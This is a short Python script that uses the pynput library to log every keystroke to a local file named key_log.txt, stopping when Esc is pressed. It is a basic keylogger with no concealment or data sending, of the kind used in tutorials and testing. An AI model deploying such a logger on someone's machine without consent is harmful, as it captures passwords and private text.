from pynput.keyboard import Listener


log_file = "key_log.txt"


def on_press(key):
    try:
        with open(log_file, "a") as log:
            log.write(str(key.char)) 
    except AttributeError:
        with open(log_file, "a") as log:
            log.write(f"[{key}]")  


def on_release(key):
    if key == key.esc:
       
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

